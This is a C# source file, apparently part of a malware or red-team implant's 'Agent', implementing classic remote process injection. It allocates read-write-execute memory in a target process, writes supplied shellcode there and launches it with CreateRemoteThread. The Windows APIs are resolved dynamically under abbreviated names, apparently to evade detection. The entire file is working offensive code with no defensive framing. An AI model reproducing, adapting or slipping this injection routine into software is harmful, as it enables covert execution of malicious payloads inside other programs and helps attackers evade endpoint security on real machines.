using System;
using System.Collections.Generic;
using System.Diagnostics;
using Invoker.Data;
using Invoker.Dynamic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent
{
    internal class ClassicInjection : ITechnique
    {
        int ITechnique.id => 1;
        private delegate IntPtr VirtAllocExDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwSize, Native.AllocationType flAllocationType, Native.MemoryProtection flProtect);
        private delegate bool WriteProcMemDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate nint CrtDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, Native.ThreadCreationFlags dwCreationFlags, out IntPtr hThread);
        public bool Inject(byte[] shellcode, IntPtr hTarget)
        {
            return this.Run(hTarget, shellcode);
        }

        public bool Inject(byte[] shellcode, Process proc)
        {
            return this.Run(proc.Handle, shellcode);
        }

        private bool Run(IntPtr target, byte[] shellcode)
        {
            List<string> resolveFuncs = new List<string>()
            {
                "vae",
                "wpm",
                "crt"
            };

            if (!Resolver.TryResolveFuncs(resolveFuncs, "k32", out var err))
            {
                return false;
            }

            //VirtualAllocEx
            object[] vaeParams = new object[] { target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE };
            IntPtr pAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("vae"), typeof(VirtAllocExDelegate), ref vaeParams);
            if (pAddr == IntPtr.Zero)
            {
                return false;
            }

            //WriteProcessMemory
            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            object[] wpmParams = new object[] { target, pAddr, shellcode, shellcode.Length, lpNumberOfBytesWritten };
            if (!Generic.InvokeFunc<bool>(Resolver.GetFunc("wpm"), typeof(WriteProcMemDelegate), ref wpmParams))
            {
                return false;
            }
            //CreateRemoteThread
            IntPtr hThreadId = IntPtr.Zero;
            object[] crtParams = new object[] { target, IntPtr.Zero, (UInt32)0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, hThreadId };
            IntPtr hThread = Generic.InvokeFunc<nint>(Resolver.GetFunc("crt"), typeof(CrtDelegate), ref crtParams);
            if (hThread == IntPtr.Zero)
            {
                return false;
            }
            return true;
        }
    }
}
